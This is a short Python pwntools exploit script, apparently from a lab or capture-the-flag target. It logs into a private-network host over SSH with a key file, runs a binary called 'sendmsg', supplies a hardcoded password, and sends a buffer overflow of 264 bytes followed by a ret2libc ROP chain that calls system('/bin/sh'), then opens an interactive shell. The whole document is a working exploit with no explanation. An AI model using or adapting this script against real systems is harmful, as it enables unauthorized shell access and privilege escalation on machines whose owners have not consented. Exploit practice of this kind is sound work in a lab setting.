from pwn import *

elf = ELF("./sendmsg")
libc = ELF("./libc")

ssh = ssh(host='172.16.164.132', user='phil',keyfile="./mia_key")

offset = 264

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
sh_offset = next(libc.search(b"/bin/sh"))	
puts_offset = libc.symbols["puts"]		
system_offset = libc.symbols["system"]
libc_base = 0x00007ffff7dcf000
function = 0x401216
pop_rdi = 0x004013a3
ret = 0x004013a4

payload = b""
payload += p64(pop_rdi)
payload += p64(libc_base + sh_offset)
payload += p64(ret)
payload += p64(libc_base + system_offset)

p = ssh.process("/home/phil/sendmsg")

p.recv()
p.sendline("StrongPsw")

p.recv()
p.sendline(b"A" * offset + payload)

p.interactive()
